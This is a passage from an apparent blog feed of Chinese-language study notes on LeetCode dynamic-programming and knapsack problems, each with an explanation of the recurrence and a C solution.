class="keyword">sizeof</span>(dp2));</span><br><span class="line"></span><br><span class="line">    dp1[<span class="number">1</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    dp2[<span class="number">1</span>] =  nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(numsSize&gt;<span class="number">1</span>) {</span><br><span class="line">        dp1[<span class="number">2</span>] = nums[<span class="number">1</span>];</span><br><span class="line">        dp2[<span class="number">2</span>] = nums[<span class="number">1</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(numsSize&gt;<span class="number">2</span>)  <span class="comment">//dp2数组从nums[1]开始计算</span></span><br><span class="line">        dp2[<span class="number">3</span>] = fmax(nums[<span class="number">2</span>], nums[<span class="number">1</span>]); <span class="comment">//注意这里是取较大值，而不是直接赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i&lt;numsSize; i++) { <span class="comment">//包含头元素</span></span><br><span class="line">        dp1[i] = fmax(dp1[i<span class="number">-2</span>]+nums[i<span class="number">-1</span>], dp1[i<span class="number">-1</span>]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">4</span>; i&lt;=numsSize; i++) {  <span class="comment">//包含尾元素</span></span><br><span class="line">        dp2[i] = fmax(dp2[i<span class="number">-2</span>]+nums[i<span class="number">-1</span>], dp2[i<span class="number">-1</span>]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fmax(dp1[numsSize<span class="number">-1</span>], dp2[numsSize]);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打家劫舍</title>
    <link href="/2024/03/12/%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/"/>
    <url>/2024/03/12/%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/house-robber/</p><p>根据题目不能连续访问相邻的数组元素，因此每次间隔只能为1或2（间隔大于2的情况包含在这两种情况内，只是多跳几步）。</p><ul><li><p><code>dp[i]</code>：表示小偷在前 i个房屋偷到的最大金额（元素之和）</p></li><li><p>递推公式：间隔为1或2，即跳跃距离为2或3，取上一步的最大值加上当前房屋的金额</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i] = fmax(dp[i<span class="number">-2</span>], dp[i<span class="number">-3</span>]) + nums[i<span class="number">-1</span>];</span><br></pre></td></tr></tbody></table></figure></li><li><p>初始化：<code>dp[0] = 0</code>；<code>dp[1] = nums[0]</code>（前1个房屋最大金额就是第一个元素）；若房屋数大于1，则<code>dp[2] = nums[1]</code>（也可从第二个房屋开始）</p></li><li><p>遍历顺序：跳跃距离为2或3，因此for循环中的 i应该大于等于3</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dp[numsSize+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(numsSize&gt;<span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">2</span>] = nums[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>; i&lt;=numsSize; i++) {</span><br><span class="line">        dp[i] = fmax(dp[i<span class="number">-2</span>], dp[i<span class="number">-3</span>]) + nums[i<span class="number">-1</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(dp[numsSize]&lt;dp[numsSize<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> dp[numsSize<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">return</span> dp[numsSize];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>组合总和IV</title>
    <link href="/2024/03/12/%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8CIV/"/>
    <url>/2024/03/12/%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8CIV/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/combination-sum-iv/</p><p>这题的难点在于，不同顺序的序列属于不同排列，因此不能单纯套用完全背包代码。所以这里的<code>dp[i][j]</code>的意思<strong>不是</strong>前i 个数能组成和为 j 的组合数。</p><ul><li><p><code>dp[i][j]</code>：第一个放入的物品为物品 0-i，恰好装满容量为 j 的背包方式数</p></li><li><p>递推公式：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[numsSize][j - nums[i<span class="number">-1</span>]];</span><br></pre></td></tr></tbody></table></figure><blockquote><p>其中<code>dp[numsSize][j-nums[i-1]]</code>表示的是第一个放入的是物品i ，恰好装满容量为 j的背包的方式数，<code>[numsSize]</code>表示剩下的物品从 1~numsSize中选择</p></blockquote></li><li><p>初始化：<code>dp[0][0]</code>初始化为1</p></li><li><p>遍历顺序：由于<code>dp[i][j]</code>取决于</p><ul><li><code>dp[i - 1][j]</code> ：故从上往下遍历。</li><li><code>dp[numsSize][j - numsSize[i-1]]</code>：即第j列的值取决于第<code>j - nums[i-1]</code>列最后一行(numsSize)的值，故必须从左往右遍历。且必须<strong>先遍历背包再遍历物品</strong>才能保证遍历到<code>dp[i][j]</code>时，<code>dp[numsSize][j - nums[i-1]]</code>的值已经被计算过。</li></ul></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">combinationSum4</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> {</span><br><span class="line">    <span class="type">int</span> dp[numsSize+<span class="number">1</span>][target+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;=target; j++) {  <span class="comment">// 背包容量</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=numsSize; i++) {  <span class="comment">// 物品</span></span><br><span class="line">            <span class="keyword">if</span>(nums[i<span class="number">-1</span>] &gt; j || dp[i<span class="number">-1</span>][j]&gt;INT_MAX-dp[numsSize][j-nums[i<span class="number">-1</span>]])</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j]; <span class="comment">// INT_MAX防止溢出</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[numsSize][j-nums[i<span class="number">-1</span>]];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dp[numsSize][target];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>完全背包</title>
    <link href="/2024/03/12/%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85/"/>
    <url>/2024/03/12/%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://kamacoder.com/problempage.php?pid=1052</p><p>详解：https://www.hello-algo.com/chapter_dynamic_programming/unbounded_knapsack_problem/</p><p>完全背包问题与0-1背包问题的区别就在于物品是否可以<strong>重复选择</strong>。完全背包问题中，每种物品的数量是无限的，将物品i 放入背包后，仍然可以从<strong>前 i 个</strong>物品中选择。</p><p><code>dp[i][j]</code>表示前 i 个物品能够放入容量为 j的背包所能达到的最大价值，分为两种情况：</p><ul><li><p>不放入物品 i，此时<code>dp[i][j] = dp[i-1][j]</code></p></li><li><p>放入物品i，此时<code>dp[i][j] = max(dp[i-1][j], dp[i][j-wgt[i-1]]+val[i-1]</code></p><blockquote><p>这里第二个表达式中是<code>dp[i]</code>，而0-1背包问题中是<code>dp[i-1]</code></p></blockquote></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">int</span> N, V;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;N, &amp;V);</span><br><span class="line">    <span class="type">int</span> wi[N], vi[N];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;wi[i], &amp;vi[i]);</span><br><span class="line">    <span class="type">int</span> dp[N+<span class="number">1</span>][V+<span class="number">1</span>];  </span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=N; i++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=V; j++) {</span><br><span class="line">            dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=wi[i<span class="number">-1</span>])</span><br><span class="line">                dp[i][j] = fmax(dp[i][j], dp[i][j-wi[i<span class="number">-1</span>]]+vi[i<span class="number">-1</span>]);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, dp[N][V]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目标和</title>
    <link href="/2024/03/11/%E7%9B%AE%E6%A0%87%E5%92%8C/"/>
    <url>/2024/03/11/%E7%9B%AE%E6%A0%87%E5%92%8C/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/target-sum/</p><p>没思路，直接参考代码随想录。</p><p>将原数组分为两部分：正数之和、负数之和。由<code>正数 + 负数 = target</code>和 <code>负数 = 正数 - sum</code>这两个式子可推出<code>正数 = (target+sum)/2</code>；接着就是利用0-1背包问题的思想解决问题。</p><ul><li><p>先计算数组元素之和<code>sum</code>，然后判断<code>sum+target</code>是否为偶数，若为奇数则原数组不可能满足条件；若<code>sum&lt;target</code>也说明原数组不满足条件</p></li><li><p><code>dp[i][j]</code>：前i个元素能够组成的 和为j的<strong>组合个数</strong></p></li><li><p>递推公式：由于这题求的是组合数，因此需要<strong>累加</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(j &lt; nums[i<span class="number">-1</span>])</span><br><span class="line">    dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i<span class="number">-1</span>][j-nums[i<span class="number">-1</span>]];</span><br></pre></td></tr></tbody></table></figure><blockquote><p>则如果不选<code>nums[i-1]</code>(即第i个元素)，方案数是<code>dp[i−1][j]</code>，如果选<code>nums[i-1]</code>，方案数是<code>dp[i−1][j−nums[i-1]]</code>(即上一个满足条件的方案数)，此时有<code>dp[i][j] = dp[i−1][j] + dp[i−1][j−nums[i-1]]</code>。</p></blockquote></li><li><p><strong>初始化</strong>：这题的初始化比较特别，<code>dp[0][0]</code>需要置为<strong>1</strong>，其他元素置为0</p><blockquote><p><code>dp[0][0]</code>的意义：当没有任何元素可以选取时，元素和只能是<code>0</code>，对应的方案数是1</p></blockquote></li><li><p>遍历顺序：需要从<code>dp[1][0]</code>开始遍历</p><blockquote><p>下标<code>j</code>从0开始遍历</p></blockquote></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">findTargetSumWays</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {</span><br><span class="line">        sum+=nums[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 正数 + 负数 = target ; 负数 = 正数 - sum =&gt; 正数 = (target+sum)/2</span></span><br><span class="line">    <span class="keyword">if</span>((sum+target)%<span class="number">2</span>!=<span class="number">0</span> || sum&lt;<span class="built_in">abs</span>(target))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="type">int</span> positive = (sum+target)/<span class="number">2</span>; <span class="comment">//加法得到的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dp[numsSize+<span class="number">1</span>][positive+<span class="number">1</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=numsSize; i++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;=positive; j++) { <span class="comment">// 从0开始</span></span><br><span class="line">            <span class="keyword">if</span>(j &lt; nums[i<span class="number">-1</span>])</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i<span class="number">-1</span>][j-nums[i<span class="number">-1</span>]];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dp[numsSize][positive];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一和零</title>
    <link href="/2024/03/11/%E4%B8%80%E5%92%8C%E9%9B%B6/"/>
    <url>/2024/03/11/%E4%B8%80%E5%92%8C%E9%9B%B6/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/ones-and-zeroes/</p><p>根据题意，需要考虑两个维度，一个是‘0’的个数，另一个是‘1’的个数，因此<code>dp</code>需要用三维数组表示，相当于两个背包最大容量分别为m和n，向这两个背包中装物品。</p><ul><li><p>先定义结构体，对应每个字符串，存放‘0’的个数和‘1’的个数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Pair</span>{</span></span><br><span class="line">    <span class="type">int</span> num_0;</span><br><span class="line">    <span class="type">int</span> num_1;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure></li><li><p>定义结构体数组，记录每个字符串中‘0’、‘1’的个数</p></li><li><p><code>dp[i][j][k]</code>：表示前<strong>i</strong>个字符串中包含<strong>j</strong>个‘0’和<strong>k</strong>个‘1’的最大字符串个数</p></li><li><p>递推公式：当j和k分别大于当前字符串中的‘0’和‘1’的个数，则<strong>字符串个数加1</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j][k] = dp[i - <span class="number">1</span>][j][k];</span><br><span class="line"><span class="keyword">if</span> (j &gt;= <span class="built_in">pair</span>[i<span class="number">-1</span>].num_0 &amp;&amp; k &gt;= <span class="built_in">pair</span>[i<span class="number">-1</span>].num_1) {</span><br><span class="line">    dp[i][j][k] = fmax(dp[i][j][k], dp[i - <span class="number">1</span>][j - <span class="built_in">pair</span>[i<span class="number">-1</span>].num_0][k - <span class="built_in">pair</span>[i<span class="number">-1</span>].num_1] + <span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>初始化：三维数组所有元素初始化为0</p></li><li><p>遍历顺序：第一层for循环即字符串下标，从<code>i=1</code>开始遍历，<code>pair[i-1]</code>表示第i个字符串</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Pair</span>{</span></span><br><span class="line">    <span class="type">int</span> num_0;</span><br><span class="line">    <span class="type">int</span> num_1;</span><br><span class="line">};</span><br><span class="line"><span class="type">int</span> <span class="title function_">findMaxForm</span><span class="params">(<span class="type">char</span>** strs, <span class="type">int</span> strsSize, <span class="type">int</span> m, <span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Pair</span> <span class="title">pair</span>[<span class="title">strsSize</span>+1];</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;strsSize; i++) { <span class="comment">//记录每个字符串中0/1个数</span></span><br><span class="line">        <span class="built_in">pair</span>[i].num_0 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">pair</span>[i].num_1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="built_in">strlen</span>(strs[i]); j++) {</span><br><span class="line">            <span class="keyword">if</span>(strs[i][j]==<span class="string">'0'</span>)</span><br><span class="line">                <span class="built_in">pair</span>[i].num_0++;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="built_in">pair</span>[i].num_1++;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dp[strsSize+<span class="number">1</span>][m+<span class="number">1</span>][n+<span class="number">1</span>]; <span class="comment">// m个0，n个1</span></span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=strsSize; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;=m; j++) {</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;=n; k++) {</span><br><span class="line">                dp[i][j][k] = dp[i - <span class="number">1</span>][j][k];</span><br><span class="line">                <span class="keyword">if</span> (j &gt;= <span class="built_in">pair</span>[i<span class="number">-1</span>].num_0 &amp;&amp; k &gt;= <span class="built_in">pair</span>[i<span class="number">-1</span>].num_1) {</span><br><span class="line">                    dp[i][j][k] = fmax(dp[i][j][k], dp[i - <span class="number">1</span>][j - <span class="built_in">pair</span>[i<span class="number">-1</span>].num_0][k - <span class="built_in">pair</span>[i<span class="number">-1</span>].num_1] + <span class="number">1</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">return</span> dp[strsSize][m][n];</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最后一块石头的重量II</title>
    <link href="/2024/03/10/%E6%9C%80%E5%90%8E%E4%B8%80%E5%9D%97%E7%9F%B3%E5%A4%B4%E7%9A%84%E9%87%8D%E9%87%8FII/"/>
    <url>/2024/03/10/%E6%9C%80%E5%90%8E%E4%B8%80%E5%9D%97%E7%9F%B3%E5%A4%B4%E7%9A%84%E9%87%8D%E9%87%8FII/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/last-stone-weight-ii/</p><p>根据题目，每次选出两个石头，要求最后剩余的石头重量最小。我的思路是先排序，每次选出最大或最小的两个，处理后继续排序，重复上述操作；运行测试用例发现不正确，选取石头不是这么简单的。</p><p>这一章节的题目都是动态规划的题，我往上面靠但是还是没思路，直接参考代码随想录，最重要的一点就是想明白：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尽量让石头分成重量相同的两堆，相撞之后剩下的石头最小</span><br></pre></td></tr></tbody></table></figure><ul><li><p>先计算石头总重量<code>sum</code>，然后设置背包最大值为<code>sum/2</code></p><blockquote><p>这里的<code>sum/2</code>是向下取整，但是重量较小的石碓 &lt;=sum/2</p></blockquote></li><li><p><code>dp[i][j]</code>：前i个石头能放入空间为j的背包的最大重量</p></li><li><p>递推式：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j]=max(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j-stones[i<span class="number">-1</span>]]+stones[i<span class="number">-1</span>])</span><br></pre></td></tr></tbody></table></figure></li><li><p>初始化：第一行第一列置为0</p></li><li><p>遍历顺序：从<code>dp[1][1]</code>开始遍历</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> {</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">lastStoneWeightII</span><span class="params">(<span class="type">int</span>* stones, <span class="type">int</span> stonesSize)</span> {</span><br><span class="line">    <span class="keyword">if</span>(stonesSize==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> stones[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;stonesSize; i++)</span><br><span class="line">        sum+=stones[i];  <span class="comment">//计算石头总重量</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> dp[stonesSize+<span class="number">1</span>][sum/<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=stonesSize; i++){</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=sum/<span class="number">2</span>; i++) {</span><br><span class="line">        dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=stonesSize; i++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=sum/<span class="number">2</span>; j++) {</span><br><span class="line">            <span class="keyword">if</span>(stones[i<span class="number">-1</span>] &gt; j)</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i][j] = max(dp[i<span class="number">-1</span>][j], dp[i<span class="number">-1</span>][j-stones[i<span class="number">-1</span>]]+stones[i<span class="number">-1</span>]);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="comment">// 两堆石头重量相减(括号里的是多的那一堆石头)</span></span><br><span class="line">    <span class="keyword">return</span> (sum - dp[stonesSize][sum/<span class="number">2</span>]) - dp[stonesSize][sum/<span class="number">2</span>];</span><br><span class="line">        </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分割等和子集</title>
    <link href="/2024/03/09/%E5%88%86%E5%89%B2%E7%AD%89%E5%92%8C%E5%AD%90%E9%9B%86/"/>
